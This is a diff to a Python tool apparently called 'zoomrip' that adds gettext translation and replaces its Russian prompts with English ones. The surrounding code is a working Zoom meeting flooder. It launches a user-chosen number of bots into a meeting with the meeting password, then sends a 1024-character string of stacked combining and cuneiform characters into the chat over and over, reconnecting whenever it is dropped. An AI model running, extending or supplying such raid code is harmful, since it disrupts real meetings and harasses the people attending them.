@@ -1,5 +1,8 @@
+import gettext
 import logging
+import os
 import re
+import sys
 from base64 import b64encode
 
 import trio
@@ -14,7 +17,16 @@ from zoom import Zoom
 logging.disable(logging.CRITICAL)
 logger.add("file_{time}.log", enqueue=True)
 
+if sys.platform.startswith('win'):
+    import locale
+    if os.getenv('LANG') is None:
+        lang, enc = locale.getdefaultlocale()
+        os.environ['LANG'] = lang
 
+gettext.install("zoomrip", "./locale")
+
+
+# noinspection PyUnresolvedReferences
 async def spam(meeting_id: int, password: str, username: str, message: str, url: str):
     """
     Спамит сообщениями в чат
@@ -26,13 +38,13 @@ async def spam(meeting_id: int, password: str, username: str, message: str, url:
     :param url: ссылка на конференцию
     """
     zoom = Zoom(url, username)
-    logger.debug(f"Joining meeting {meeting_id} with password {password}")
+    logger.debug(_("Joining meeting {meeting_id} with password {password}"), meeting_id=meeting_id, password=password)
     while True:
         try:
             meeting = await zoom.join_meeting(meeting_id, password)
 
             async with meeting as ws:
-                logger.info(f"{username}: Started sending messages...")
+                logger.info(_("{username}: Started sending messages..."), username=username)
                 while True:
                     try:
                         await ws.get_message()
@@ -41,34 +53,36 @@ async def spam(meeting_id: int, password: str, username: str, message: str, url:
                             zoom.create_payload(4135, {"text": text, "destNodeID": 0})
                         )
                     except WrongPasswordError:
-                        logger.warning("Server: wrong password, ignoring...")
+                        logger.warning(_("Server: wrong password, ignoring..."))
                         continue
                     except (ClosedResourceError, ConnectionClosed, AttributeError):
-                        logger.warning("Server closed connection, trying again...")
+                        logger.warning(_("Server closed connection, trying again..."))
                         await trio.sleep(3)
                         break
         except (ClosedResourceError, ConnectionClosed, AttributeError):
-            logger.warning("Server closed connection, trying again...")
+            logger.warning(_("Server closed connection, trying again..."))
             await trio.sleep(3)
             pass
 
 
+# noinspection PyUnresolvedReferences
 async def main():
-    url = input("Введите ссылку на конференцию Zoom: ").strip()
+    url = input(_("Enter zoom meeting link: ")).strip()
     password = input(
-        "Введите пароль от конференции, если он есть и не указан в ссылке (или нажмите Enter): "
+        _("Enter a meeting password, if there is any and it's not specified in the url (or press Enter): ")
     ).strip()
 
     username = input(
-        "Введите имя, которое будут использовать боты (без русских букв): "
+        _("Enter a name that bots will use (English only): ")
     )
-    bot_count = int(input("Введите количество ботов: "))
+
+    bot_count = int(input(_("Enter the amount of bots: ")))
     message = "𒐫𪚥𒈙á́́́́́́́́́́́́́́́́́́́́́́́́́́́́́"
     message = message * int(1024 / len(message))
 
     url_parsed = re.findall(url_re, url)
     if len(url_parsed) == 0:
-        logger.error("Неверная ссылка!")
+        logger.error(_("Incorrect link!"))
         return
 
     meeting_id = url_parsed[0][1]
